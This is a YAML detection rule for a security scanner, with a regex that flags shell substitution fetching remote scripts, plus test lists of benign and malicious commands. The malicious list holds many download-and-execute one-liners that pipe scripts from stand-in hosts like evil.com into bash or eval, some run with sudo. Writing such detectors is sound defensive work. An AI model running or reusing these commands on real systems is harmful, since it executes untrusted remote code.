name: high-13-shell-substitution-download
severity: high
description: >
  Detects shell command substitution, backticks, and process substitution downloading remote scripts.

pattern: |
  (?i)(\$\(|`|<\()(curl|wget).*(https?|ftp)://

malicious:
  - "$(curl http://evil.com/malware.sh | bash)"
  - "echo $(wget -qO- http://attacker.com/payload.sh) | sh"
  - "$(curl -s https://malware.com/backdoor.sh | sh)"
  - 'bash -c "$(wget -O - http://evil.com/dropper.sh)"'
  - "$(curl http://bad.com/script.sh)"
  - 'sh -c "$(wget -qO- https://evil.com/exploit.sh)"'
  - "$(curl -fsSL http://attacker.com/install.sh | bash)"
  - "eval $(wget -qO- ftp://evil.com/payload.sh)"
  - "payload=$(curl http://attacker.com/malware.sh); eval $payload"
  - "$(curl -H 'User-Agent: Mozilla' http://evil.com/obfuscated.sh | sh)"
  - "$(curl -L http://evil.com/stage2.sh) | bash"
  - "$(wget -qO- https://evil.com/ransomware.sh) | sudo bash"
  - 'eval "$(curl -s http://malware.com/loader.sh)"'
  - 'cmd=$(curl http://evil.com/command.sh); sh -c "$cmd"'
  - "$(curl -k https://attacker.com/payload.sh | bash -s)"
  - "$(curl ftp://attacker.com/dropper.sh) > /tmp/d.sh && bash /tmp/d.sh"
  - "`curl http://evil.com/script.sh | bash`"
  - "`wget -qO- http://attacker.com/malware.sh | sh`"
  - "eval `curl -s https://evil.com/payload.sh`"
  - "`wget -O - http://malware.com/dropper.sh`"
  - 'sh -c "`curl http://evil.com/backdoor.sh`"'
  - "bash <(curl http://evil.com/script.sh)"
  - "sh <(wget -qO- https://attacker.com/payload.sh)"
  - "bash <(curl -s http://malware.com/installer.sh)"
  - 'eval "bash <(curl http://evil.com/exploit.sh)"'
  - "sudo bash <(wget -qO- ftp://evil.com/dropper.sh)"
  - "bash <(curl -fsSL http://attacker.com/malware.sh)"

benign:
  - '$(echo "Hello World")'
  - "$(date)"
  - "$(ls -la)"
  - "result=$(command arg1 arg2)"
  - "$(pwd)"
  - "$(whoami)"
  - "var=$(cat file.txt)"
  - "$(grep pattern file.txt)"
  - "$(uname -a)"
  - "output=$(ps aux | grep process)"
  - "$(hostname)"
  - "$(df -h)"
  - "version=$(git describe --tags)"
  - "$(which python)"
  - "$(find . -name '*.log')"
  - "count=$(wc -l < file.txt)"
  - "$(echo $PATH | tr ':' '\n')"
  - "$(printenv HOME)"
  - "user=$(id -un)"
  - "$(awk '{print $1}' data.txt)"
  - "$(git rev-parse HEAD)"
  - "$(basename /path/to/file.txt)"
  - "dir=$(dirname $0)"
  - "$(date +%Y-%m-%d)"
  - "files=$(ls *.txt)"
  - "`date`"
  - "`pwd`"
  - "`whoami`"
  - "bash <(cat script.sh)"
  - "sh <(echo 'ls -la')"
